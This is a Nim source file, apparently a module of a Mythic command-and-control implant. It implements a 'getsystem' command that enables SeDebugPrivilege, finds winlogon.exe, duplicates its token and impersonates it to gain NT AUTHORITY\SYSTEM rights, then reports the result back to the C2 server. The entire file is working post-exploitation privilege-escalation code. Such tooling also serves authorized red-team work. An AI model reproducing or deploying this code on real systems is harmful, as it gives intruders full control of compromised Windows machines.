import ../utils/mythic_responses
import ../utils/debug
import std/[json, strformat, strutils]
import token_manager

when defined(windows):
  import winim/lean
  
  const
    TH32CS_SNAPPROCESS = 0x00000002
    TOKEN_ADJUST_PRIVILEGES = 0x0020
    TOKEN_QUERY = 0x0008
    SE_PRIVILEGE_ENABLED = 0x00000002
    
  type
    PROCESSENTRY32W = object
      dwSize: DWORD
      cntUsage: DWORD
      th32ProcessID: DWORD
      th32DefaultHeapID: ULONG_PTR
      th32ModuleID: DWORD
      cntThreads: DWORD
      th32ParentProcessID: DWORD
      pcPriClassBase: LONG
      dwFlags: DWORD
      szExeFile: array[260, WCHAR]
    
    LUID = object
      LowPart: DWORD
      HighPart: LONG
    
    LUID_AND_ATTRIBUTES = object
      Luid: LUID
      Attributes: DWORD
    
    TOKEN_PRIVILEGES = object
      PrivilegeCount: DWORD
      Privileges: array[1, LUID_AND_ATTRIBUTES]
    
    SECURITY_IMPERSONATION_LEVEL = enum
      SecurityAnonymous = 0
      SecurityIdentification = 1
      SecurityImpersonation = 2
      SecurityDelegation = 3
    
    TOKEN_TYPE = enum
      TokenPrimary = 1
      TokenImpersonation = 2
  
  # Windows API imports
  proc CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD): HANDLE 
    {.importc, dynlib: "kernel32.dll", stdcall.}
  
  proc Process32FirstW(hSnapshot: HANDLE, lppe: ptr PROCESSENTRY32W): WINBOOL 
    {.importc, dynlib: "kernel32.dll", stdcall.}
  
  proc Process32NextW(hSnapshot: HANDLE, lppe: ptr PROCESSENTRY32W): WINBOOL 
    {.importc, dynlib: "kernel32.dll", stdcall.}
  
  proc LookupPrivilegeValueW(lpSystemName: LPCWSTR, lpName: LPCWSTR, lpLuid: ptr LUID): WINBOOL 
    {.importc, dynlib: "advapi32.dll", stdcall.}
  
  proc AdjustTokenPrivileges(TokenHandle: HANDLE, DisableAllPrivileges: WINBOOL, 
                             NewState: ptr TOKEN_PRIVILEGES, BufferLength: DWORD,
                             PreviousState: ptr TOKEN_PRIVILEGES, ReturnLength: ptr DWORD): WINBOOL 
    {.importc, dynlib: "advapi32.dll", stdcall.}
  
  proc DuplicateTokenEx(hExistingToken: HANDLE, dwDesiredAccess: DWORD,
                        lpTokenAttributes: LPSECURITY_ATTRIBUTES,
                        ImpersonationLevel: SECURITY_IMPERSONATION_LEVEL,
                        TokenType: TOKEN_TYPE, phNewToken: ptr HANDLE): WINBOOL 
    {.importc, dynlib: "advapi32.dll", stdcall.}
  
  proc ImpersonateLoggedOnUser(hToken: HANDLE): WINBOOL 
    {.importc, dynlib: "advapi32.dll", stdcall.}

proc getsystem*(taskId: string, params: JsonNode): JsonNode =
  ## Elevate to SYSTEM by duplicating winlogon.exe token
  when defined(windows):
    try:
      debug "[DEBUG] GetSystem: Starting elevation process"
      
      # Get the username before elevation
      let oldUser = getCurrentUsername()
      
      debug &"[DEBUG] GetSystem: Current user: {oldUser}"
      
      # Enable SeDebugPrivilege
      var hToken: HANDLE = 0
      if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr hToken) != 0:
        debug "[DEBUG] GetSystem: Opened current process token"
        
        var luid: LUID
        let privName = newWideCString("SeDebugPrivilege")
        if LookupPrivilegeValueW(nil, privName, addr luid) != 0:
          debug "[DEBUG] GetSystem: Looked up SeDebugPrivilege"
          
          var tp = TOKEN_PRIVILEGES(
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES(Luid: luid, Attributes: SE_PRIVILEGE_ENABLED)]
          )
          
          discard AdjustTokenPrivileges(hToken, 0, addr tp, DWORD(sizeof(TOKEN_PRIVILEGES)), nil, nil)
          
          debug "[DEBUG] GetSystem: Adjusted token privileges"
        
        CloseHandle(hToken)
      
      # Create snapshot of processes
      let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
      if snapshot == INVALID_HANDLE_VALUE:
        return mythicError(taskId, "Failed to create process snapshot")
      
      debug "[DEBUG] GetSystem: Created process snapshot"
      
      # Find winlogon.exe
      var processEntry: PROCESSENTRY32W
      processEntry.dwSize = DWORD(sizeof(PROCESSENTRY32W))
      
      var winlogonPid: DWORD = 0
      
      if Process32FirstW(snapshot, addr processEntry) != 0:
        while true:
          let processName = $cast[WideCString](addr processEntry.szExeFile[0])
          if processName.toLowerAscii().contains("winlogon"):
            winlogonPid = processEntry.th32ProcessID
            debug &"[DEBUG] GetSystem: Found winlogon.exe with PID {winlogonPid}"
            break
          
          if Process32NextW(snapshot, addr processEntry) == 0:
            break
      
      CloseHandle(snapshot)
      
      if winlogonPid == 0:
        return mythicError(taskId, "Failed to find winlogon.exe process")
      
      # Open winlogon process
      let processHandle = OpenProcess(MAXIMUM_ALLOWED, 0, winlogonPid)
      if processHandle == 0:
        return mythicError(taskId, &"Failed to open winlogon process: {GetLastError()}")
      
      debug "[DEBUG] GetSystem: Opened winlogon process"
      
      # Open process token
      var tokenHandle: HANDLE = 0
      if OpenProcessToken(processHandle, MAXIMUM_ALLOWED, addr tokenHandle) == 0:
        let err = GetLastError()
        CloseHandle(processHandle)
        return mythicError(taskId, &"Failed to open process token: {err}")
      
      debug "[DEBUG] GetSystem: Opened winlogon token"
      
      # Duplicate the token
      var duplicatedToken: HANDLE = 0
      if DuplicateTokenEx(
        tokenHandle,
        MAXIMUM_ALLOWED,
        nil,
        SecurityImpersonation,
        TokenImpersonation,
        addr duplicatedToken
      ) == 0:
        let err = GetLastError()
        CloseHandle(tokenHandle)
        CloseHandle(processHandle)
        return mythicError(taskId, &"Failed to duplicate token: {err}")
      
      debug "[DEBUG] GetSystem: Duplicated token"
      
      CloseHandle(tokenHandle)
      CloseHandle(processHandle)
      
      # Impersonate the SYSTEM token
      if ImpersonateLoggedOnUser(duplicatedToken) == 0:
        let err = GetLastError()
        CloseHandle(duplicatedToken)
        return mythicError(taskId, &"Failed to impersonate SYSTEM token: {err}")
      
      debug "[DEBUG] GetSystem: Impersonated SYSTEM token"
      
      # Store the token handle
      setTokenHandle(duplicatedToken)
      
      # After getsystem, we're always NT AUTHORITY\SYSTEM (hardcoded like oopsie)
      let newUser = "NT AUTHORITY\\SYSTEM"
      
      debug &"[DEBUG] GetSystem: New user: {newUser}"
      
      let output = &"Successfully elevated from {oldUser} to {newUser}"
      
      # Build response with callback data (updates impersonation context)
      return mythicCallback(taskId, output, %*{
        "impersonation_context": newUser
      })
      
    except Exception as e:
      return mythicError(taskId, &"GetSystem error: {e.msg}")
  else:
    return mythicError(taskId, "getsystem command is only available on Windows")
